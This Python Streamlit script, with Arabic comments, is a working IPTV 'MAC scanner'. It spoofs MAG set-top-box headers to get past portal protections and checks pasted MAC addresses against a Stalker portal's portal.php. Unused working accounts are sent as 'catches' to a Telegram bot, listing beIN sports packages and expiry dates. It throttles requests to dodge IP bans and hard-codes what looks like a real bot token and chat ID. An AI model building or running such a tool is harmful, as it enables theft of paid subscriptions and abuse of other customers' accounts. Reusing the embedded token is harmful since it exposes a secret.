import streamlit as st
import requests
import time
import telebot
import re
import urllib3
import random

# إيقاف تحذيرات SSL لضمان عدم توقف الفحص
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- إعداداتك الخاصة ---
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

# الباقات المفضلة
FAV_CHANNELS = {
    "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
    "IARI BEIN SPORTS 8K": ["8K", "IARI"],
    "IARI BEIN SPORTS 4K": ["4K", "IARI"]
}

st.set_page_config(page_title="Radar Ayoub Pro", layout="wide")
st.title("📡 Radar Ayoub Hammami Ultimate")

# تصميم الواجهة
st.markdown("""
<style>
    .reportview-container { background: #0e1117; }
    .stMetric { border: 1px solid #ff4b4b; padding: 10px; border-radius: 5px; }
</style>
""", unsafe_allow_html=True)

input_text = st.text_area("🚀 الصق الرابط والماكات هنا:", height=150)

def get_pro_headers(mac):
    """توليد رأسيات طلب محترفة جداً لتجاوز أنظمة الحماية"""
    return {
        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Safari/533.3',
        'X-User-Agent': 'Model: MAG254; Link: WiFi',
        'Cookie': f'mac={mac}',
        'Referer': 'http://mag.infomir.com/',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive'
    }

if st.button("🏁 بدء الفحص العميق والمتخفي"):
    macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', input_text.upper())))
    host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', input_text)
    
    if host_match and macs:
        base_url = host_match.group(0).split('/portal.php')[0].rstrip('/')
        api_url = f"{base_url}/portal.php"
        
        st.info(f"🌐 المستهدف: {base_url} | 🎯 الأهداف: {len(macs)}")
        
        c1, c2 = st.columns(2)
        stat_checked = c1.empty()
        stat_found = c2.empty()
        progress = st.progress(0)
        
        found_count = 0
        final_results = []

        for i, mac in enumerate(macs):
            headers = get_pro_headers(mac)
            try:
                # محاولة جلب البروفايل مباشرة بمهلة انتظار أطول
                start_time = time.time()
                r = requests.get(f"{api_url}?type=stb&action=get_profile&force_stb=1", 
                                 headers=headers, timeout=20, verify=False)
                latency = (time.time() - start_time) * 1000
                
                if r.status_code == 200 and '"active_cons"' in r.text:
                    active_users = re.search(r'"active_cons"\s*:\s*"(\d+)"', r.text).group(1)
                    expiry = re.search(r'"end_date"\s*:\s*"([^"]+)"', r.text).group(1) if '"end_date"' in r.text else "N/A"
                    strength = "قوي ✅" if latency < 1200 else "متقطع ⚠️"
                    
                    # فحص القنوات
                    r_ch = requests.get(f"{api_url}?type=itv&action=get_all_channels", 
                                        headers=headers, timeout=20, verify=False)
                    ch_text = r_ch.text.upper()
                    found_favs = [n for n, k in FAV_CHANNELS.items() if all(x in ch_text for x in k)]
                    
                    if active_users == "0":
                        found_count += 1
                        alert = (f"🎯 **صيد جديد!**\n\n🖥️ `{mac}`\n📊 القوة: {strength}\n👥 المتصلون: {active_users}\n"
                                 f"📅 الانتهاء: `{expiry}`\n🌐 `{base_url}`\n📺 الباقات: {', '.join(found_favs)}")
                        bot.send_message(ID, alert, parse_mode="Markdown")

                    final_results.append({
                        "الماك": mac, "الحالة": "يشتغل 🟢", "القوة": strength, 
                        "المستخدمين": active_users, "الانتهاء": expiry, "الباقات": ", ".join(found_favs)
                    })
                else:
                    final_results.append({"الماك": mac, "الحالة": "معطل 🔴", "القوة": "-", "المستخدمين": "-", "الانتهاء": "-", "الباقات": "-"})
            
            except Exception as e:
                final_results.append({"الماك": mac, "الحالة": "خطأ 🔴", "القوة": "فشل اتصال", "المستخدمين": "-", "الانتهاء": "-", "الباقات": "-"})
            
            # تحديث الواجهة
            stat_checked.metric("إجمالي الفحص", i + 1)
            stat_found.metric("الصيد المتاح", found_count)
            progress.progress((i + 1) / len(macs))
            time.sleep(1.5) # ضروري جداً لتجنب حظر الـ IP

        st.table(final_results)
        st.balloons()
    else:
        st.error("❌ الرابط أو الماكات غير صحيحة.")

